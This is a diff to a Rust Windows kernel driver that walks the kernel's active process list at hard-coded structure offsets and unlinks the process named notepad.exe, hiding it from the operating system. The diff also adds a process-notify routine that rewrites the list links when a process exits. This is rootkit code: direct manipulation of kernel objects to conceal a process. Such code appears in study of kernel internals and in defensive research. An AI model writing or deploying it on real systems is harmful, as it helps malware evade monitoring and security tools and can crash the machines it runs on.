@@ -43,6 +43,8 @@ extern "C"{
     pub fn PsGetCurrentProcessId() -> *mut c_void;
     pub fn PsGetCurrentThreadId() -> *mut c_void;
     pub fn PsLookupProcessByProcessId(pid: HANDLE,peprocess: *mut c_void)-> NTSTATUS;
+    pub fn PsSetCreateProcessNotifyRoutine( functionpointer: *mut c_void, toremove: u8) -> NTSTATUS;
+    
     //pub fn ZwOpenProcess() -> *mut c_void;
 }
 
@@ -80,61 +82,47 @@ pub struct idtentry64{
 
 
 
-pub fn getallthehandles(){
-    unsafe{
-        let prochandle = ZwCurrentProcess;
-             
-        let mut buffsize: usize = 1024;
-        let mut returnlength = 0;
-        let mut buffer = loop{
-            
-            
-            let mut baseaddress = 0 as *mut *mut c_void;
-            let res1 = NtAllocateVirtualMemory(prochandle, 
-                 core::mem::transmute(baseaddress) , 
-                0, 
-                &mut buffsize , 
-                0x00001000|0x00002000, 
-                0x4);   // 0x4 page_Readwrite
+pub extern "C" fn processcreationnotifyroutine(parentid: HANDLE, pid: HANDLE, iscreated:u8) {
+   
+   // process is created = 1
+    /*if iscreated==1{
 
-            if res1!=STATUS_SUCCESS{
-                return ();
-            }
-
-
-            let ntstatus = NtQuerySystemInformation(16, 
-               core::mem::transmute(baseaddress) , 
-               buffsize as u32,
-            &mut returnlength  );
-
-            buffsize = usize::try_from(returnlength).unwrap();
-
-            if NT_SUCCESS(ntstatus){
-                break baseaddress;
-            }
-
-            NtFreeVirtualMemory(prochandle, 
-              core::mem::transmute(baseaddress)  , 
-              0 as *mut usize, 
-              0x00008000); // 0x00008000 mem_release
+        let mut eprocess:u64 = 0 ;
+        let res = unsafe{PsLookupProcessByProcessId(pid, &mut eprocess as *mut _ as *mut c_void)};
+        if res==STATUS_SUCCESS{
 
            
-        };
-       
+            let mut pname = unsafe{core::ptr::read((eprocess as usize + 0x5a8) as *const [u8;15])};
+            unsafe{DbgPrint("process created pid: %s\n\0".as_ptr(), pname.as_mut_ptr() as *mut c_void)};
 
-        DbgPrint("base: %I64x\n\0".as_ptr(), buffer);
-        NtFreeVirtualMemory(prochandle, 
-            core::mem::transmute(buffer)  , 
-            0 as *mut usize, 
-            0x00008000); // 0x00008000 mem_release
-       
-        NtClose(prochandle as *mut c_void);
-                  
-   
+
+        }
+
+    }*/
+
+
+    if iscreated==0{
+        let mut eprocess:u64 = 0 ;
+        let res = unsafe{PsLookupProcessByProcessId(pid, &mut eprocess as *mut _ as *mut c_void)};
+        if res==STATUS_SUCCESS{
+
+           
+            let prevflinkaddress = unsafe{core::ptr::read((eprocess as usize + 0x448+0x8) as *mut u64)};
+            unsafe{core::ptr::write(prevflinkaddress as *mut u64, (eprocess + 0x448))};
+
+            let mut nextlinkaddress = unsafe{core::ptr::read((eprocess+0x448) as *mut u64)};
+            nextlinkaddress += 8;
+            unsafe{core::ptr::write(nextlinkaddress as *mut u64, eprocess+0x448)};
+
+        }
     }
+
+
 }
 
 
+
+static targetpid: u32 = 0;
 
 
 #[no_mangle]
@@ -142,83 +130,96 @@ pub extern "system" fn driver_entry(_driver: &mut DRIVER_OBJECT,
      _: *const UNICODE_STRING) -> u32 {
     unsafe {
 
+        
+       PsSetCreateProcessNotifyRoutine(processcreationnotifyroutine as *mut c_void , 0);
+      
+
+
+
+       let mut eprocess:u64 = 0 ;
+       let status =  PsLookupProcessByProcessId(PsGetCurrentProcessId(),
+       &mut eprocess as *mut _ as *mut c_void );
 
        
-        let mut eprocess:u64 = 0 ;
-        let status =  PsLookupProcessByProcessId(PsGetCurrentProcessId(),
-        &mut eprocess as *mut _ as *mut c_void );
- 
-        if status==0{
-            DbgPrint("eprocess at: %I64x\n\0".as_ptr(), eprocess);
+       if status==0{
+          // DbgPrint("eprocess at: %I64x\n\0".as_ptr(), eprocess);
 
-            // 0x448 activeprocesslinks
-            // 0x5a8  imagefilename 
-            let activeprocesslinks = eprocess + 0x448;
+           // 0x448 activeprocesslinks
+           // 0x5a8  imagefilename 
+           let activeprocesslinks = eprocess + 0x448;
 
 
-            // reading 8 bytes at activeprocesslinks
-            let mut byteswritten = 0;
-            let mut firstaddress:u64 = 0 ;
-            let mmcopy = MM_COPY_ADDRESS{address:activeprocesslinks as *mut c_void};
-            let res = MmCopyMemory(&mut firstaddress as *mut _ as *mut c_void,  
-                mmcopy, 
-                8, 
-                2, 
-                &mut byteswritten);
+           // reading 8 bytes at activeprocesslinks
+           let mut byteswritten = 0;
+           let mut firstaddress:u64 = 0 ;
+           let mmcopy = MM_COPY_ADDRESS{address:activeprocesslinks as *mut c_void};
+           let res = MmCopyMemory(&mut firstaddress as *mut _ as *mut c_void,  
+               mmcopy, 
+               8, 
+               2, 
+               &mut byteswritten);
 
-            let mut nexteprocess = 0;
-            let mut flink = firstaddress;
+           let mut nexteprocess = 0;
+           let mut flink = firstaddress;
 
-            if res==STATUS_SUCCESS{
-                loop{
-                    nexteprocess = flink - 0x448;
+           if res==STATUS_SUCCESS{
+               loop{
+                   nexteprocess = flink - 0x448;
 
-                    let imagenamepointer = nexteprocess + 0x5a8;
-    
-                    //DbgPrint("processname: %s\n\0".as_ptr(), imagenamepointer as *mut c_void);
-    
-    
-                    let mut name = core::ptr::read(imagenamepointer as *mut [u8;11]);
-                    let procname = core::str::from_utf8(&name).unwrap();
-                    DbgPrint("procname: %s\n\0".as_ptr(), name.as_mut_ptr() as *mut c_void);
+                   let imagenamepointer = nexteprocess + 0x5a8;
+   
+                   //DbgPrint("processname: %s\n\0".as_ptr(), imagenamepointer as *mut c_void);
+   
+   
+                   let mut name = core::ptr::read(imagenamepointer as *mut [u8;11]);
+                   let procname = core::str::from_utf8(&name).unwrap();
+                   //DbgPrint("procname: %s\n\0".as_ptr(), name.as_mut_ptr() as *mut c_void);
 
-                    if "notepad.exe".as_bytes() == &name{
-                        let previouseprocess = core::ptr::read((nexteprocess+0x448+0x8) as *mut u64)-0x448;
-                        let forwardforwardlink = core::ptr::read((nexteprocess+0x448) as *mut u64);
-                        //let backwardbackwardlink = core::ptr::read((previouseprocess+0x448+0x8) as *mut u64);
+                   if "notepad.exe".as_bytes() == &name{
+                       let previouseprocess = core::ptr::read((nexteprocess+0x448+0x8) as *mut u64)-0x448;
+                       let forwardforwardlink = core::ptr::read((nexteprocess+0x448) as *mut u64);
+                       //let backwardbackwardlink = core::ptr::read((previouseprocess+0x448+0x8) as *mut u64);
 
-                        core::ptr::write((previouseprocess+0x448) as *mut u64, forwardforwardlink);
-                        core::ptr::write((forwardforwardlink+0x8) as *mut u64, (previouseprocess+0x448));
-
-
-                    }
-             
-                    let mut byteswritten = 0;
-                    
-                    let mmcopy = MM_COPY_ADDRESS{address:(nexteprocess+0x448) as *mut c_void};
-                    let res = MmCopyMemory(&mut flink as *mut _ as *mut c_void,  
-                        mmcopy, 
-                        8, 
-                        2, 
-                        &mut byteswritten);
-                    
-                    if byteswritten!=8 || res!=0{
-                        break;
-                    }
-                    
-                    if flink==firstaddress{
-                        break;
-                    }
+                       core::ptr::write((previouseprocess+0x448) as *mut u64, forwardforwardlink);
+                       core::ptr::write((forwardforwardlink+0x8) as *mut u64, (previouseprocess+0x448));
 
 
-                }
-                
-            }
+                   }
             
+                   let mut byteswritten = 0;
+                   
+                   let mmcopy = MM_COPY_ADDRESS{address:(nexteprocess+0x448) as *mut c_void};
+                   let res = MmCopyMemory(&mut flink as *mut _ as *mut c_void,  
+                       mmcopy, 
+                       8, 
+                       2, 
+                       &mut byteswritten);
+                   
+                   if byteswritten!=8 || res!=0{
+                       break;
+                   }
+                   
+                   if flink==firstaddress{
+                       break;
+                   }
 
-        }
+
+               }
+               
+           }
+           
+
+       }
+
 
        
+
+
+
+
+
+
+
     }
 
     0
